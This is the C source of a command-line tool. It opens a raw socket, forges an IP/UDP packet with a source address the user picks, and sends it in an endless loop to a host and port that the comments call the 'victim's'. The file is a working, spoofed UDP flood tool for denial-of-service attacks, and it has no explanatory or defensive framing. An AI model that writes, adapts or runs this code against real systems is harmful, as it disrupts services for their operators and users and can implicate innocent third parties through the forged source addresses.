#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/udp.h> 
#include <netdb.h> 

/* ______________________________________________ */ 
/* Converting the host name into its IP address */ 
/* ______________________________________________ */ 
unsigned long resolve(char *hostname) 
{ 
	struct hostent *hp; 
	if ( (hp = gethostbyname(hostname)) == NULL)
	{ 
	    herror("gethostbyname() failed");
		exit(-1); 
	}
		
	return *(unsigned long *)hp->h_addr_list[0];
	
}

/* __________________________ */
/* Calculating the checksum */
/* __________________________ */ 
unsigned short in_cksum(unsigned short *addr, int len)
{ 
	unsigned short result; 
	unsigned int sum = 0; 
	/* Adding all 2-byte words */ 
	while (len > 1)
	{
	   sum +=*addr++; 
	   len -= 2; 
 	}
/* If there is a byte left over, adding it to the sum */ 

	if (len ==1 ) 
	sum += *(unsigned char*) addr; 
    sum = (sum >> 16) + (sum & 0xFFFF);	/* Adding the carry */ 
	sum += (sum >> 16); /* Adding the carry again */ 
	result = ~sum; /* Inverting the result */ 
	return 	result; 
} 

/* _____________________ */
/* The main()function */ 
/* _____________________ */ 
int main(int argc, char *argv[])
{ 
	int sd; 
	const int on = 1; 
	unsigned long dstaddr, srcaddr; 
	int dport, sport; 
	struct sockaddr_in servaddr; 
	
	/* The pseudo header structure */ 
	struct pseudohdr
	{ 
		unsigned int source_address; 
		unsigned int dest_address; 
		unsigned char place_holder; 
		unsigned char protocol; 
		unsigned short length; 
	} pseudo_hdr; 

	char sendbuf[sizeof(struct iphdr) + sizeof(struct udphdr)]; 
	struct iphdr *ip_hdr = (struct iphdr *)sendbuf; 
	struct udphdr *udp_hdr = (struct udphdr *) (sendbuf + sizeof(struct iphdr)); 
	unsigned char *pseudo_packet; /* A pointer to the pseudo packet */


	if (argc != 5) 
	{ 
		fprintf(stderr, "Usage: %s <source address> <source port> <destination address> <destination port>\n", argv[0]);
		exit(-1);
	}	
	
	/* Creating a raw socket */ 
	if ( (sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{ 
		perror("socket() failed"); 
		exit(-1);
	}		
	/* Because the IP header will be filled in the program, set the IP_HDRINCL option */ 
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) 
	{ 
		perror("setsockopt() failed"); 
		exit(-1);
	}		
		srcaddr = resolve(argv[1]);
		/* The source IP address */ 
		sport = atoi(argv[2]); 
		/* The source port */ 
		
		dstaddr = resolve(argv[3]); 
		/* The victim's IP address */
		dport = atoi(argv[4]); 	
		/* The victim's port */ 
		bzero(&servaddr, sizeof(servaddr)); 
		servaddr.sin_family = AF_INET; 
		servaddr.sin_port = htons(dport); 
		servaddr.sin_addr.s_addr = dstaddr; 
		/* Filling the IP header */ 
		ip_hdr->ihl = 5; 
		ip_hdr->version = 4; 
		ip_hdr->tos = 0; 
		ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)); 
		ip_hdr->id = 0;
		ip_hdr->frag_off = 0; 
		ip_hdr->ttl = 255; 
		ip_hdr->protocol = IPPROTO_UDP; 
		ip_hdr->check = 0; 
		ip_hdr->check = in_cksum((unsigned short *)ip_hdr, sizeof(struct iphdr)); 
		ip_hdr->saddr = srcaddr; 
		ip_hdr->daddr = dstaddr; 
		/* Filling the pseudo header */ 
		pseudo_hdr.source_address = srcaddr; 
		pseudo_hdr.dest_address = dstaddr;
		pseudo_hdr.place_holder = 0;
		pseudo_hdr.protocol = IPPROTO_UDP; 
		pseudo_hdr.length = htons(sizeof(struct udphdr));
		
		/* Filling the UDP header */ 
		udp_hdr->source = htons(sport); 
		udp_hdr->dest = htons(dport); 
		udp_hdr->len = htons(sizeof(struct udphdr)); 
		udp_hdr->check = 0; 
		
		/* Allocating memory for formatting a pseudo packet */ 
		if ( (pseudo_packet = (char*)malloc(sizeof(pseudo_hdr) + sizeof(struct udphdr))) == NULL)
		{
			perror("malloc() failed"); 
			exit(-1); 
		}
		
		/* Copying the pseudo header to the start of the pseudo packet */ 
		memcpy(pseudo_packet, &pseudo_hdr, sizeof(pseudo_hdr)); 
		/* Copying the UDP header */ 
		memcpy(pseudo_packet + sizeof(pseudo_hdr), sendbuf + sizeof(struct iphdr), sizeof(struct udphdr));
		/* Calculating the UDP header checksum */ 
		if ( (udp_hdr->check = in_cksum((unsigned short *)pseudo_packet, sizeof(pseudo_hdr) + sizeof(struct udphdr))) ==0 )
		{	
			udp_hdr->check = 0xffff; 
		}
		/* Sending packets in an endless loop */ 
		while (1)
		{ 
			if (sendto(sd, sendbuf, sizeof(sendbuf), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
			{ 
				perror("sendto() failed"); 
				exit(-1); 
				} 
		} 
		return 0; 
}